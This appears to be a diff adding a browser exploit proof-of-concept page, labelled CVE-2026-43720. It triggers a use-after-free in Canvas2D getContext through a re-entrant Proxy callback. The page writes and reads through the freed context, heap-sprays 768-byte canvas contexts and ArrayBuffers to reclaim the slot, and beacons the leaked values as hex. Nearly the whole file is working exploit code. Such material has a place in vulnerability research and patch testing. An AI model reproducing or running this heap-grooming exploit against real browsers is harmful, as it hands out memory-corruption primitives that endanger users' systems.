@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>V568</title></head>
+<body style="background:#111;color:#0f0;font:13px monospace;padding:10px">
+<pre id="log"></pre>
+<script>
+var L=document.getElementById('log');
+function log(m){L.textContent+=m+'\n'}
+function beacon(tag,data){
+  log('[B] '+tag+': '+data);
+  try{
+    var x=new XMLHttpRequest();
+    x.open('GET','/beacon/V568-'+tag+'?d='+encodeURIComponent(String(data).substring(0,500))+'&t='+Date.now(),false);
+    x.send();
+  }catch(e){}
+}
+function d2hex(d){
+  var f=new Float64Array(1);f[0]=d;
+  var u=new Uint8Array(f.buffer);
+  var h='';for(var i=7;i>=0;i--)h+=('0'+u[i].toString(16)).slice(-2);
+  return '0x'+h;
+}
+
+window.onerror=function(m,s,l,c){beacon('ONERROR',m+'|'+s+':'+l+':'+c)};
+beacon('BOOT','V568-stale-read-after-free');
+
+// =============================================
+// CVE-2026-43720: Re-entrant getContext TOCTOU UAF
+// Outer getContext('2d', dictProxy) passes m_context null check.
+// Proxy callback during dict conversion: inner getContext('2d') creates C1.
+// Outer continues past the check, creates C2, setContext(C2) frees C1.
+// ctxA = C1 (FREED, dangling), ctxB = C2 (LIVE).
+// =============================================
+var uafCanvas, ctxA, ctxB;
+
+try {
+  uafCanvas = document.createElement('canvas');
+  uafCanvas.width = 4; uafCanvas.height = 4;
+  document.body.appendChild(uafCanvas);
+
+  var dictProxy = new Proxy({}, {
+    get: function(target, prop) {
+      if (prop === 'alpha' && !ctxA) {
+        ctxA = uafCanvas.getContext('2d');
+        return true;
+      }
+      return undefined;
+    }
+  });
+
+  ctxB = uafCanvas.getContext('2d', dictProxy);
+  beacon('T1', 'setup|a=' + !!ctxA + '|b=' + !!ctxB + '|same=' + (ctxA === ctxB));
+
+  // =============================================
+  // T2: Write sentinels through dangling ctxA (writes to freed C1 memory)
+  // Non-virtual setter: realizeSaves(no-op) → stateStack.last() → m_buffer[0].lineWidth
+  // m_buffer still points to inline buffer → writes to freed slot → SHOULD WORK
+  // =============================================
+  var SENTINEL_LW = 1.23456789012345e-100;
+  var SENTINEL_ML = 9.87654321098765e-100;
+  var SENTINEL_GA = 0.31337;
+  var SENTINEL_LDO = 7.77777;
+
+  ctxA.lineWidth = SENTINEL_LW;
+  ctxA.miterLimit = SENTINEL_ML;
+  ctxA.globalAlpha = SENTINEL_GA;
+  ctxA.lineDashOffset = SENTINEL_LDO;
+  ctxA.setTransform(1.111, 2.222, 3.333, 4.444, 5.555, 6.666);
+
+  beacon('T2', 'sentinels-written');
+
+  // =============================================
+  // T3: Read sentinels back through dangling ctxA (stale read from freed memory)
+  // This is the CRITICAL test: does lineWidth work on the dangling pointer?
+  // =============================================
+  var r = {};
+  try { r.lw = ctxA.lineWidth; } catch(e) { r.lw = 'CRASH:'+e.message; }
+  try { r.ml = ctxA.miterLimit; } catch(e) { r.ml = 'CRASH:'+e.message; }
+  try { r.ga = ctxA.globalAlpha; } catch(e) { r.ga = 'CRASH:'+e.message; }
+  try { r.ldo = ctxA.lineDashOffset; } catch(e) { r.ldo = 'CRASH:'+e.message; }
+
+  var lwMatch = (r.lw === SENTINEL_LW);
+  var mlMatch = (r.ml === SENTINEL_ML);
+  beacon('T3A', 'lw=' + r.lw + '|match=' + lwMatch);
+  beacon('T3B', 'ml=' + r.ml + '|match=' + mlMatch);
+  beacon('T3C', 'ga=' + r.ga + '|ldo=' + r.ldo);
+
+  try {
+    var t = ctxA.getTransform();
+    beacon('T3D', 'xform|a='+t.a+'|b='+t.b+'|c='+t.c+'|d='+t.d+'|e='+t.e+'|f='+t.f);
+  } catch(e) {
+    beacon('T3D', 'CRASH:'+e.message);
+  }
+
+  // =============================================
+  // T4: Verify ctxB is a DIFFERENT object (live C2, default values)
+  // =============================================
+  try {
+    beacon('T4', 'ctxB-lw=' + ctxB.lineWidth + '|ml=' + ctxB.miterLimit + '|ga=' + ctxB.globalAlpha);
+  } catch(e) {
+    beacon('T4', 'CRASH:'+e.message);
+  }
+
+  // =============================================
+  // T5: Spray 768B allocations to try to reclaim C1's slot
+  // Phase A: Canvas2D contexts (same type, 768B each)
+  // =============================================
+  beacon('T5A', 'spraying-contexts');
+  var sprayCtxs = [];
+  for (var i = 0; i < 200; i++) {
+    var sc = document.createElement('canvas');
+    sc.width = 1; sc.height = 1;
+    sprayCtxs.push(sc.getContext('2d'));
+  }
+
+  // Check if lineWidth changed (another context reclaimed the slot)
+  try {
+    var postCtxLW = ctxA.lineWidth;
+    var changed = (postCtxLW !== SENTINEL_LW);
+    beacon('T5B', 'post-ctx-spray|lw=' + postCtxLW + '|changed=' + changed);
+    if (changed && !isNaN(postCtxLW)) {
+      beacon('T5C', 'lw-hex=' + d2hex(postCtxLW));
+    }
+    if (changed) {
+      // Also read other props to see what we got
+      try { beacon('T5D', 'ml=' + ctxA.miterLimit + '|hex=' + d2hex(ctxA.miterLimit)); } catch(e) { beacon('T5D','CRASH'); }
+      try { beacon('T5E', 'ga=' + ctxA.globalAlpha + '|hex=' + d2hex(ctxA.globalAlpha)); } catch(e) { beacon('T5E','CRASH'); }
+      try {
+        var t2 = ctxA.getTransform();
+        beacon('T5F', 'xform|a='+d2hex(t2.a)+'|b='+d2hex(t2.b)+'|c='+d2hex(t2.c));
+      } catch(e) { beacon('T5F','CRASH'); }
+    }
+  } catch(e) {
+    beacon('T5B', 'CRASH:' + e.message);
+  }
+
+  // =============================================
+  // T6: If context spray didn't reclaim, try ArrayBuffer(768) spray
+  // (zero-init → should cause CrashOnOverflow if reclaimed)
+  // =============================================
+  beacon('T6A', 'spraying-AB768');
+  var abs = [];
+  for (var i = 0; i < 500; i++) {
+    abs.push(new ArrayBuffer(768));
+  }
+
+  try {
+    var postAbLW = ctxA.lineWidth;
+    beacon('T6B', 'post-ab-spray|lw=' + postAbLW + '|hex=' + d2hex(postAbLW));
+  } catch(e) {
+    // CrashOnOverflow if AB reclaimed the slot (m_size=0)
+    beacon('T6B', 'CRASH:' + e.message);
+  }
+
+  // =============================================
+  // T7: Read ctxA transform (6 doubles spanning wider offsets)
+  // Even if lineWidth crashed above, transform might still work
+  // if the crash was from a different code path
+  // =============================================
+  try {
+    var t3 = ctxA.getTransform();
+    beacon('T7', 'xform-final|a='+d2hex(t3.a)+'|d='+d2hex(t3.d));
+  } catch(e) {
+    beacon('T7', 'CRASH:' + e.message);
+  }
+
+  // =============================================
+  // T8: If we can still read, try to detect reclaim via iteration
+  // Set sentinel, spray 1 object, check, repeat
+  // =============================================
+  try {
+    ctxA.lineWidth = 99.99;
+    var detected = false;
+    for (var round = 0; round < 50 && !detected; round++) {
+      // Allocate one 768B object per round
+      var tc = document.createElement('canvas');
+      tc.width = 1; tc.height = 1;
+      tc.getContext('2d');
+
+      var check = ctxA.lineWidth;
+      if (check !== 99.99) {
+        beacon('T8', 'RECLAIM-DETECTED|round=' + round + '|val=' + check + '|hex=' + d2hex(check));
+        detected = true;
+      }
+    }
+    if (!detected) {
+      beacon('T8', 'no-reclaim-after-50-rounds');
+    }
+  } catch(e) {
+    beacon('T8', 'CRASH:' + e.message);
+  }
+
+} catch(e) {
+  beacon('FATAL', '' + e.message + '|' + (e.stack||'').substring(0,200));
+}
+
+beacon('DONE', 'V568-complete');
+</script>
+</body></html>
